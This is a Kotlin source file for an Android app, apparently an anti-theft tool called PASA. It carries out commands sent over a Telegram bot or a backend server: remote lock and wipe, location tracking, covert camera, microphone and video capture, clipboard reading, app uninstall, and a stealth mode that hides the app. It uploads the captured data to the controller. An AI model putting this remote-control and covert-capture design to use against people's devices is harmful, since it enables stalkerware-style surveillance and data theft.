package com.izhaanintellect.pasa.bot

import android.util.Log
import com.izhaanintellect.pasa.commands.*
import com.izhaanintellect.pasa.data.CommandLog
import com.izhaanintellect.pasa.data.CommandLogDao
import com.izhaanintellect.pasa.data.PreferencesManager
import com.izhaanintellect.pasa.security.AuthManager
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Validates, routes, and executes incoming Telegram commands.
 * Handles photo/audio/location dispatch and records audit logs.
 */
@Singleton
class CommandExecutor @Inject constructor(
    private val authManager: AuthManager,
    private val preferencesManager: PreferencesManager,
    private val commandLogDao: CommandLogDao,
    private val telegramApi: TelegramApi,
    private val lockCommand: LockCommand,
    private val wipeCommand: WipeCommand,
    private val locateCommand: LocateCommand,
    private val trackCommand: TrackCommand,
    private val snapCommand: SnapCommand,
    private val recordCommand: RecordCommand,
    private val ringCommand: RingCommand,
    private val statusCommand: StatusCommand,
    private val infoCommand: InfoCommand,
    private val networkCommand: NetworkCommand,
    private val appManageCommand: AppManageCommand,
    private val stealthCommand: StealthCommand,
    private val helpCommand: HelpCommand,
    private val messageCommand: MessageCommand,
    private val clipboardCommand: ClipboardCommand,
    private val videoCommand: VideoCommand,
    private val pasaBackendApi: com.izhaanintellect.pasa.network.PasaBackendApi
) {
    companion object {
        private const val TAG = "PASA_Executor"
    }

    suspend fun execute(parsed: CommandParser.ParsedCommand): String {
        Log.i(TAG, "Command received: '${parsed.command}' from chat ${parsed.chatId}")

        // 1. Authorization Verification
        if (!authManager.isAuthorizedChat(parsed.chatId)) {
            Log.w(TAG, "Rejected unauthorized command '${parsed.command}' from chat ${parsed.chatId}")
            logExecution(parsed, "REJECTED", "Unauthorized access denied")
            return "⛔ Access Denied: This PASA instance is configured for a different administrator."
        }

        // 2. Command Lookup
        val handler = resolveHandler(parsed.command)
        if (handler == null) {
            val response = "❓ Unknown command: <code>${parsed.command}</code>\nSend <code>/help</code> for available commands."
            sendText(parsed.chatId, response)
            logExecution(parsed, "FAILED", response)
            return response
        }

        // 3. Execution
        return try {
            val result = handler.execute(parsed.args, parsed.chatId)

            // Deliver text response
            sendText(parsed.chatId, result.message)

            // Deliver photo if generated
            result.photoFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    sendPhoto(parsed.chatId, file, "📸 Captured photo")
                }
            }

            // Deliver audio if recorded
            result.audioFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    sendAudio(parsed.chatId, file, "🎙️ Audio recording")
                }
            }

            // Deliver video if recorded
            result.videoFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    sendVideo(parsed.chatId, file, "🎥 Captured video")
                }
            }

            // Deliver pin location if acquired
            result.location?.let { (lat, lng) ->
                sendLocation(parsed.chatId, lat, lng)
            }

            val status = if (result.success) "SUCCESS" else "FAILED"
            logExecution(parsed, status, result.message)
            result.message

        } catch (e: Exception) {
            Log.e(TAG, "Command execution failure", e)
            val errorMsg = "❌ Execution Error: ${e.localizedMessage ?: "Unexpected failure"}"
            sendText(parsed.chatId, errorMsg)
            logExecution(parsed, "FAILED", errorMsg)
            errorMsg
        }
    }

    suspend fun executeRemoteCommand(parsed: CommandParser.ParsedCommand, commandId: String): String {
        Log.i(TAG, "Executing remote command '$commandId': ${parsed.command}")
        
        if (!authManager.isAuthorizedChat(parsed.chatId)) {
            Log.w(TAG, "Rejected unauthorized remote command '${parsed.command}' from chat ${parsed.chatId}")
            val errorMsg = "⛔ Access Denied: This PASA instance is configured for a different administrator."
            sendResponseToBackend(commandId, errorMsg, null, null, null, null)
            logExecution(parsed, "REJECTED", "Unauthorized access denied")
            return errorMsg
        }

        val handler = resolveHandler(parsed.command)
        if (handler == null) {
            val response = "❓ Unknown command: <code>${parsed.command}</code>\nSend <code>/help</code> for available commands."
            sendResponseToBackend(commandId, response, null, null, null, null)
            return response
        }

        return try {
            val result = handler.execute(parsed.args, parsed.chatId)
            val delivered = sendResponseToBackend(
                commandId = commandId,
                message = result.message,
                photoFile = result.photoFile,
                audioFile = result.audioFile,
                videoFile = result.videoFile,
                location = result.location
            )

            if (!delivered) {
                // Direct fallback to Telegram
                sendText(parsed.chatId, result.message)
                result.photoFile?.let { sendPhoto(parsed.chatId, it, "📸 Captured photo") }
                result.audioFile?.let { sendAudio(parsed.chatId, it, "🎙️ Audio recording") }
                result.videoFile?.let { sendVideo(parsed.chatId, it, "🎥 Captured video") }
                result.location?.let { (lat, lng) -> sendLocation(parsed.chatId, lat, lng) }
            }

            val status = if (result.success) "SUCCESS" else "FAILED"
            logExecution(parsed, status, result.message)
            result.message
        } catch (e: Exception) {
            Log.e(TAG, "Remote command execution failure", e)
            val errorMsg = "❌ Execution Error: ${e.localizedMessage ?: "Unexpected failure"}"
            sendResponseToBackend(commandId, errorMsg, null, null, null, null)
            logExecution(parsed, "FAILED", errorMsg)
            errorMsg
        }
    }

    suspend fun sendRejectionToBackend(commandId: String, reason: String): Boolean {
        return sendResponseToBackend(commandId, reason, null, null, null, null)
    }

    private suspend fun sendResponseToBackend(

        commandId: String?,
        message: String,
        photoFile: File?,
        audioFile: File?,
        videoFile: File?,
        location: Pair<Double, Double>?
    ): Boolean {
        if (!preferencesManager.useBackendServer) return false
        return try {
            val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
            val cmdIdBody = commandId?.toRequestBody("text/plain".toMediaTypeOrNull())
            val msgBody = message.toRequestBody("text/plain".toMediaTypeOrNull())

            val photoPart = photoFile?.let {
                if (it.exists() && it.length() > 0) {
                    val reqFile = it.asRequestBody("image/jpeg".toMediaTypeOrNull())
                    MultipartBody.Part.createFormData("photo", it.name, reqFile)
                } else null
            }

            val audioPart = audioFile?.let {
                if (it.exists() && it.length() > 0) {
                    val reqFile = it.asRequestBody("audio/m4a".toMediaTypeOrNull())
                    MultipartBody.Part.createFormData("audio", it.name, reqFile)
                } else null
            }

            val videoPart = videoFile?.let {
                if (it.exists() && it.length() > 0) {
                    val reqFile = it.asRequestBody("video/mp4".toMediaTypeOrNull())
                    MultipartBody.Part.createFormData("video", it.name, reqFile)
                } else null
            }

            val latBody = location?.first?.toString()?.toRequestBody("text/plain".toMediaTypeOrNull())
            val lngBody = location?.second?.toString()?.toRequestBody("text/plain".toMediaTypeOrNull())

            val resp = pasaBackendApi.sendDeviceResponse(
                deviceId = deviceIdBody,
                commandId = cmdIdBody,
                message = msgBody,
                photo = photoPart,
                audio = audioPart,
                video = videoPart,
                latitude = latBody,
                longitude = lngBody
            )
            resp.ok
        } catch (e: Exception) {
            Log.w(TAG, "Failed to relay response via VPS backend: ${e.message}")
            false
        }
    }

    private fun resolveHandler(cmd: String): Command? {
        return when (cmd) {
            "/lock", "/lock_message" -> lockCommand
            "/wipe", "/wipe_confirm", "/wipe_external", "/format" -> wipeCommand
            "/locate", "/gps", "/where" -> locateCommand
            "/track", "/track_stop" -> trackCommand
            "/snap", "/photo", "/camera" -> snapCommand
            "/video", "/videocap", "/vr" -> videoCommand
            "/record", "/audio", "/mic" -> recordCommand
            "/ring", "/alarm", "/siren", "/ring_stop" -> ringCommand
            "/status" -> statusCommand
            "/info", "/device" -> infoCommand
            "/network", "/net", "/ip" -> networkCommand
            "/apps", "/app_uninstall" -> appManageCommand
            "/message", "/msg", "/broadcast", "/alert_screen" -> messageCommand
            "/clipboard", "/clip", "/paste" -> clipboardCommand
            "/hide", "/show", "/stealth" -> stealthCommand
            "/help", "/start" -> helpCommand
            else -> null
        }
    }

    private suspend fun sendVideo(chatId: Long, file: File, caption: String) {
        try {
            val chatIdBody = chatId.toString().toRequestBody("text/plain".toMediaTypeOrNull())
            val captionBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
            val fileBody = file.asRequestBody("video/mp4".toMediaTypeOrNull())
            val part = MultipartBody.Part.createFormData("video", file.name, fileBody)

            telegramApi.sendVideo(
                token = preferencesManager.botToken,
                chatId = chatIdBody,
                video = part,
                caption = captionBody
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to upload video", e)
        }
    }

    private suspend fun sendText(chatId: Long, message: String) {
        try {
            telegramApi.sendMessage(
                token = preferencesManager.botToken,
                request = SendMessageRequest(chatId = chatId, text = message)
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send text message", e)
        }
    }

    private suspend fun sendPhoto(chatId: Long, file: File, caption: String) {
        try {
            val chatIdBody = chatId.toString().toRequestBody("text/plain".toMediaTypeOrNull())
            val captionBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
            val fileBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val part = MultipartBody.Part.createFormData("photo", file.name, fileBody)

            telegramApi.sendPhoto(
                token = preferencesManager.botToken,
                chatId = chatIdBody,
                photo = part,
                caption = captionBody
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to upload photo", e)
        }
    }

    private suspend fun sendAudio(chatId: Long, file: File, caption: String) {
        try {
            val chatIdBody = chatId.toString().toRequestBody("text/plain".toMediaTypeOrNull())
            val captionBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
            val fileBody = file.asRequestBody("audio/mp4".toMediaTypeOrNull())
            val part = MultipartBody.Part.createFormData("audio", file.name, fileBody)

            telegramApi.sendAudio(
                token = preferencesManager.botToken,
                chatId = chatIdBody,
                audio = part,
                caption = captionBody
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to upload audio", e)
        }
    }

    private suspend fun sendLocation(chatId: Long, lat: Double, lng: Double) {
        try {
            telegramApi.sendLocation(
                token = preferencesManager.botToken,
                request = SendLocationRequest(chatId = chatId, latitude = lat, longitude = lng)
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to dispatch location pin", e)
        }
    }

    private suspend fun logExecution(parsed: CommandParser.ParsedCommand, status: String, response: String) {
        try {
            commandLogDao.insert(
                CommandLog(
                    command = parsed.command,
                    args = parsed.args.joinToString(" "),
                    chatId = parsed.chatId,
                    senderName = parsed.senderName,
                    status = status,
                    response = response.take(500)
                )
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error inserting command log", e)
        }
    }
}
